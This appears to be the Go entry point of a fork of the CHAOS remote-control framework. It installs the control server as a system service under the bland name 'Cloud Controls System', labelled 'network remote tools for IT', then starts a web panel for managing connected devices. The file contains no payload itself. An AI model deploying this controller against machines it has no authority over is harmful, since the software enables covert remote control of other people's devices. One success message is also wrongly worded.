package main

import (
	"embed"
	"fmt"
	"os"

	"path/filepath"

	"github.com/gin-gonic/gin"
	"github.com/kardianos/service"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/infrastructure/database"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/middleware"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/internal/utils/ui"
	httpDelivery "github.com/tiagorlampert/CHAOS/presentation/http"
	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
	deviceRepo "github.com/tiagorlampert/CHAOS/repositories/device"
	userRepo "github.com/tiagorlampert/CHAOS/repositories/user"
	"github.com/tiagorlampert/CHAOS/services/auth"
	"github.com/tiagorlampert/CHAOS/services/client"
	"github.com/tiagorlampert/CHAOS/services/device"

	// "github.com/tiagorlampert/CHAOS/services/proxy"
	"github.com/tiagorlampert/CHAOS/services/url"
	"github.com/tiagorlampert/CHAOS/services/user"
	"gorm.io/gorm"
)

const AppName = "CCS"

var Version = "dev"

//go:embed web/static
var staticFiles embed.FS

type Program struct{}

func (p *Program) Start(s service.Service) error {
	go p.run()
	return nil
}

func (p *Program) Stop(s service.Service) error {
	fmt.Println("Service stopped")
	return nil
}

type App struct {
	Logger        *logrus.Logger
	Configuration *environment.Configuration
	Router        *gin.Engine
}

func main() {
	_ = system.ClearScreen()
	srvConfig := &service.Config{
		Name:        "cloud_controls_system",
		DisplayName: "Cloud Controls System",
		Description: "network remote tools for IT",
	}
	prg := &Program{}
	s, err := service.New(prg, srvConfig)
	if err != nil {
		fmt.Println(err)
	}
	if len(os.Args) > 1 {
		serviceAction := os.Args[1]
		switch serviceAction {
		case "install":
			err := s.Install()
			if err != nil {
				fmt.Println("Install Service Failed: ", err.Error())
			} else {
				fmt.Println("Install Service Success")
			}
			return
		case "uninstall":
			err := s.Uninstall()
			if err != nil {
				fmt.Println("Uninstall Service Failed: ", err.Error())
			} else {
				fmt.Println("Uninstall Service Failed")
			}
			return
		case "start":
			err := s.Start()
			if err != nil {
				fmt.Println("Service Start Failed: ", err.Error())
			} else {
				fmt.Println("Service Start Success")
			}
			return
		case "stop":
			err := s.Stop()
			if err != nil {
				fmt.Println("Service Stop Failed: ", err.Error())
			} else {
				fmt.Println("Service Stop Success")
			}
			return
		}
	}

	err = s.Run()
	if err != nil {
		fmt.Println(err)
	}
}

func (p *Program) run() {

	logger := logrus.New()
	logger.Info(`Loading environment variables`)

	exePath, err := os.Executable()
	if err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`Failed to get the current program path`)
	}
	workDir := filepath.Dir(exePath)
	if err := os.Chdir(workDir); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`Failed to set working directory`)
	}

	if err := Setup(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error running setup`)
	}

	configuration, err := environment.Load()
	if err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error loading environment variables`)
	}

	db, err := database.NewProvider(configuration.Database)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error connecting with database`)
	}

	if err := db.Migrate(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error migrating database`)
	}

	if err := NewApp(logger, configuration, db.Conn).Run(); err != nil {
		logger.WithField(`cause`, err).Fatal(fmt.Sprintf("failed to start %s Application", AppName))
	}
}

func NewApp(logger *logrus.Logger, configuration *environment.Configuration, dbClient *gorm.DB) *App {
	authRepository := authRepo.NewRepository(dbClient)
	userRepository := userRepo.NewRepository(dbClient)
	deviceRepository := deviceRepo.NewRepository(dbClient)

	authService := auth.NewAuthService(logger, configuration.SecretKey, authRepository)
	userService := user.NewUserService(userRepository)
	deviceService := device.NewDeviceService(deviceRepository)
	clientService := client.NewClientService(Version, configuration, authRepository, authService)
	urlService := url.NewUrlService(clientService)

	// proxyService := proxy.NewProxyService()
	// go proxyService.ProxyUrl(":56780", "http://10.10.10.2")

	if err := userService.CreateDefaultUser(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error setting up default user`)
	}

	router := httpDelivery.NewRouter(&staticFiles)
	jwtMiddleware := middleware.NewJwtMiddleware(authService, userService)

	httpDelivery.NewController(configuration, router, logger, jwtMiddleware, clientService, authService, userService, deviceService, urlService)

	return &App{
		Configuration: configuration,
		Logger:        logger,
		Router:        router,
	}
}

func Setup() error {
	return utils.CreateDirs(internal.TempDirectory, internal.DatabaseDirectory)
}

func (a *App) Run() error {
	ui.ShowMenu(Version, a.Configuration.Server.Port)

	a.Logger.WithFields(logrus.Fields{`version`: Version, `port`: a.Configuration.Server.Port}).Info(`Starting `, AppName)

	return httpDelivery.NewServer(a.Router, a.Configuration)
}
